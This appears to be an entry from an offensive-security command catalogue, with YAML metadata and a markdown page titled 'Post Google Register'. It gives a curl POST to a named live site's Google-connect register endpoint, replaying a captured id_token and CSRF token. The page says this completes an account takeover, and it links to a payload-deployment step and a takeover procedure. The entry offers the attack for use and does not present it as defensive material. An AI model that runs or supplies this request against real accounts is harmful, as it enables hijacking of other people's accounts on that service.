---
data: >-
  curl -X POST "https://www.yelp.dk/google_connect/register" -d
  "id_token=eyJhbGciOiJSUzI1NiIs...&csrftok=abc123" -v
tags:
  - oauth
  - ato
type: command
output: |-
  HTTP/1.1 200 OK
  Account linked successfully
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:34.329Z'
id: f68ab512-adf0-41f3-bb64-470162be26a6
verified: false
validated: true
submitted: true
---
# Post Google Register

## Command

```bash
curl -X POST "https://www.yelp.dk/google_connect/register" -d "id_token=eyJhbGciOiJSUzI1NiIs...&csrftok=abc123" -v
```

## Description

Simulates the linking POST with captured id_token and csrftok to complete ATO.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | Form data with id_token and csrftok | Yes |

## Examples

### Basic Usage

Use captured values from payload execution.

## Expected Output

200 OK response indicating successful linking.

## Related

- [[commands/deploy-ato-payload]]
- [[procedures/Perform-Account-Takeover-via-Google-Linking]]
